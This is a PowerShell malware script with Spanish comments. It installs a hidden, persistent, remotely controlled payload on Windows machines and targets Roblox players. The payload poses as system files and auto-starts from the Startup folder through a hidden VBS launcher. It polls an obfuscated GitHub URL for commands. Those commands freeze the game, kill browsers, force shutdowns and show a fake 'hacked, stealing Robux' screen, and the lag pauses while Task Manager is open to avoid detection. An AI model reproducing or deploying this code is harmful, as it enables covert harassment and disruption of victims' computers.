# --- CONFIGURACIÓN DE RUTAS ---
$dir = "$env:LOCALAPPDATA\WinSystem"
if (-not (Test-Path $dir)) { New-Item -Path $dir -ItemType Directory -Force }
$psFile = "$dir\TaskHostWin.ps1"
$vbsFile = "$dir\Launcher.vbs"
$startupPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\WinSystemUpdate.lnk"

# --- 1. MOTOR DE CONTROL (TaskHostWin.ps1) ---
$c1 = '$u = 104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47,112,111,108,103,97,116,105,122,47,108,111,120,47,109,97,105,110,47,99,111,110,116,114,111,108,46,116,120,116; $controlUrl = -join ($u | % {[char]$_})' + "`n"
$c2 = '$windowTitle = "*Roblox*"' + "`n"

$c3 = 'function MostrarHacker($l1, $l2) {' + "`n"
$c4 = '    $b64 = "ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAhISEgQUxFUlRBIERFIFNJU1RFTUEgISEhDQogICAgICAgICAgICAgICAgPT09PT09PT09PT09PT09PT09PT09PT09PT09DQoNCiAgICAgICAgICAgICAgICAgIEhBQ0tFQURPIFBPUiBQRUtVIE1FWElDTw0KDQogICAgICAgICAgIEdSQUNJQVMgUE9SIEpVR0FSIEVOIE5VRVNUUk9TIFNFUlZFUlMgUElSQVRBUw0KDQogICAgICAgICAgICAgICAgIFJPQkFORE8gQ1VFTlRBIFkgUk9CVUtTLi4uLg0KDQogICAgICAgICAgICAgICAgPT09PT09PT09PT09PT09PT09PT09PT09PT09DQogICAgICAgICAgICAgICAgRVNUQURPOiBDT01QUk9NRVRJRE8gKDEwMCUpDQogICAgICAgICAgICAgICAgUEFURU5URSBNWCAyMDI2IC0gTE9YIE5FVA0KDQogICAgICAgICAgICAgICAgICAgICIgKyAkbDEgKyAiDQogICAgICAgICAgICAgICAgICAgICIgKyAkbDIgKyAiDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIA=="' + "`n"
$c5 = '    $ascii = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($b64))' + "`n"
$c6 = '    $pathS = "$env:TEMP\syserr.ps1"' + "`n"
$c7 = '    $cmd = "$Host.UI.RawUI.BackgroundColor=''DarkBlue'';$Host.UI.RawUI.ForegroundColor=''White'';Clear-Host;Write-Host ''$ascii'';for(`$i=0;`$i -lt 8;`$i++){[Console]::Beep(400,100);[Console]::Beep(600,100)};Read-Host ''CONEXION PERDIDA''"' + "`n"
$c8 = '    Set-Content -Path $pathS -Value $cmd -Force' + "`n"
$c9 = '    Start-Process powershell.exe -ArgumentList "-ExecutionPolicy Bypass", "-File", "`"$pathS`"" -WindowStyle Maximized' + "`n"
$c10 = '}' + "`n"

# Inyectar API de C# para suspender procesos
$c11 = 'try { $api = "[DllImport(""ntdll.dll"")] public static extern uint NtSuspendProcess(IntPtr h); [DllImport(""ntdll.dll"")] public static extern uint NtResumeProcess(IntPtr h);"; Add-Type -TypeDefinition "using System; using System.Runtime.InteropServices; public class Win32 { $api }" -ErrorAction SilentlyContinue } catch {}' + "`n"

$c12 = 'while($true) {' + "`n"
$c13 = '    try {' + "`n"
$c14 = '        $raw = (Invoke-WebRequest -Uri $controlUrl -UseBasicParsing -ErrorAction SilentlyContinue).Content' + "`n"
$c15 = '        $lineas = $raw -split "`n" | Where-Object { $_ -and $_.Trim() -notlike "#*" }' + "`n"
$c16 = '        $partes = $lineas[0].Trim() -split ''\|''' + "`n"
$c17 = '        $comando = $partes[0]' + "`n"
$c18 = '    } catch { $comando = "OFF" }' + "`n"

$c19 = '    if ($comando -eq "OFF") { Start-Sleep -Seconds 30; continue }' + "`n"
$c20 = '    $roblox = Get-Process | Where-Object { $_.MainWindowTitle -like $windowTitle }' + "`n"

$c21 = '    if ($roblox) {' + "`n"
$c22 = '        $h = $roblox[0].Handle; $TargetID = $roblox[0].Id' + "`n"
$c23 = '        switch ($comando) {' + "`n"
$c24 = '            "INFO" { $ip = (Invoke-WebRequest -Uri "https://api.ipify.org" -UseBasicParsing).Content; Start-Process powershell.exe -ArgumentList "-Command", "Write-Host ''IP: $ip'' -Fore Green; Read-Host" }' + "`n"
$c25 = '            "VOICE" { (New-Object -ComObject SAPI.SpVoice).Speak($partes[1]) }' + "`n"
$c26 = '            "GHOST" { Start-Process notepad; Start-Sleep -Seconds 2; $w = New-Object -ComObject WScript.Shell; $partes[1].ToCharArray() | % { $w.SendKeys($_); Start-Sleep -Milliseconds 80 } }' + "`n"
$c27 = '            "HACK" { Get-Process chrome, msedge, firefox -ErrorAction SilentlyContinue | Stop-Process -Force; MostrarHacker $partes[1] $partes[2]; shutdown.exe /s /t 60 /c "PEKU MEXICO" }' + "`n"
$c28 = '            "MINIMIZE" { (New-Object -ComObject Shell.Application).MinimizeAll() }' + "`n"
$c29 = '        }' + "`n"

# --- REINTEGRACIÓN DEL LAG ---
$c30 = '        $step = 1' + "`n"
$c31 = '        while (Get-Process -Id $TargetID -ErrorAction SilentlyContinue) {' + "`n"
$c32 = '            if (Get-Process -Name "taskmgr" -ErrorAction SilentlyContinue) { [Win32]::NtResumeProcess($h); Start-Sleep -Seconds 5; continue }' + "`n"
# El lag se activa si el comando es LAG o HACK, o por defecto si no es OFF
$c33 = '            $ints = if($comando -eq "HACK"){ 99 } elseif($comando -eq "LAG"){ [math]::Min(98, ($step / 300) * 98) } else { 0 }' + "`n"
$c34 = '            if($ints -gt 0) {' + "`n"
$c35 = '                [Win32]::NtSuspendProcess($h); Start-Sleep -Milliseconds $ints' + "`n"
$c36 = '                [Win32]::NtResumeProcess($h); Start-Sleep -Milliseconds (100 - $ints)' + "`n"
$c37 = '            } else { Start-Sleep -Seconds 2 }' + "`n"
$c38 = '            $step++; if($step -gt 1000){$step=1000}' + "`n"
# Re-revisar comando cada 10 iteraciones
$c39 = '            if($step % 10 -eq 0){ break }' + "`n"
$c40 = '        }' + "`n"
$c41 = '    }' + "`n"
$c42 = '    Start-Sleep -Seconds 10' + "`n"
$c43 = '}'

$psContent = $c1+$c2+$c3+$c4+$c5+$c6+$c7+$c8+$c9+$c10+$c11+$c12+$c13+$c14+$c15+$c16+$c17+$c18+$c19+$c20+$c21+$c22+$c23+$c24+$c25+$c26+$c27+$c28+$c29+$c30+$c31+$c32+$c33+$c34+$c35+$c36+$c37+$c38+$c39+$c40+$c41+$c42+$c43

# --- 2. LANZADOR Y PERSISTENCIA ---
$vbsContent = 'Set WshShell = CreateObject("WScript.Shell")' + "`n" + 'WshShell.Run "powershell.exe -ExecutionPolicy Bypass -File ""' + $psFile + '""", 0, False'
Set-Content -Path $psFile -Value $psContent -Force
Set-Content -Path $vbsFile -Value $vbsContent -Force
$WshShell = New-Object -ComObject WScript.Shell
$Shortcut = $WshShell.CreateShortcut($startupPath); $Shortcut.TargetPath = "wscript.exe"; $Shortcut.Arguments = "`"$vbsFile`""; $Shortcut.Save()
Start-Process "wscript.exe" -ArgumentList "`"$vbsFile`""
